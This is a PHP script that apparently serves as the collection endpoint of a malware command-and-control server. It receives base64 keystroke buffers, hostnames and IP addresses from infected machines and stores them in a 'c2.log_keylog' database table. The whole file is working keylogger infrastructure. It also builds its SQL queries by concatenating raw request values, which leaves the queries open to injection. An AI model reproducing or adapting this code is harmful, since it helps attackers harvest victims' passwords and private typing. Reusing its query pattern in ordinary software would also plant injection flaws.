
<?php

include 'conf.php';
include 'db.php';

?>


<?php


if( isset($_REQUEST["keylog_buffer"]) ) {
	
	$b64 = $_REQUEST["keylog_buffer"];  
	$ip = $_SERVER['REMOTE_ADDR'];
	$hostname = $_REQUEST["hostname"];
	
	$sql = "select * from c2.log_keylog where ip_address ='" . $ip . "'";
	$result = $conn->query($sql);

	if ($result->num_rows > 0) {
		$sql = "UPDATE c2.log_keylog SET b64='" . $b64 . "' where ip_address ='" . $ip . "' and hostname = '" . $hostname . "'";
		$result = $conn->query($sql);
		if ($result) {
			echo "OK";
		}else{
			echo "ERR";
		}
	
	}else{
		
		$sql = "INSERT INTO c2.log_keylog (ip_address,b64,hostname) VALUES ('" . $ip . "','" . $b64 . "','" . $hostname ."')";
		$result = $conn->query($sql);
		
		if ($result) {
			echo "OK";
		}else{
			echo "ERR";
		}
		
	}
	
}



 
?>




